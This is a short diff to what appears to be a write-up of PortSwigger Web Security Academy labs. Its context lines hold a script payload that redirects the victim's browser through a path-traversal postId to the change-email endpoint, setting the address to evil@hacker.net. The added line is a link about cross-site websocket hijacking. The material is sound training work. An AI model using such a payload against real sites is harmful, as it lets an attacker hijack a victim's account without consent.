@@ -42,3 +42,5 @@ The postId is directly used to construct the redirection path, which canm be exp
     document.location = "https://0afe00bd04a2155a81a117a3004f0014.web-security-academy.net/post/comment/confirmation?postId=../../my-account/change-email/?email=evil%40hacker.net%26submit=1"
 </script>
 ```
+
+[Cross-site websocket hijacking (CSWSH)](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)
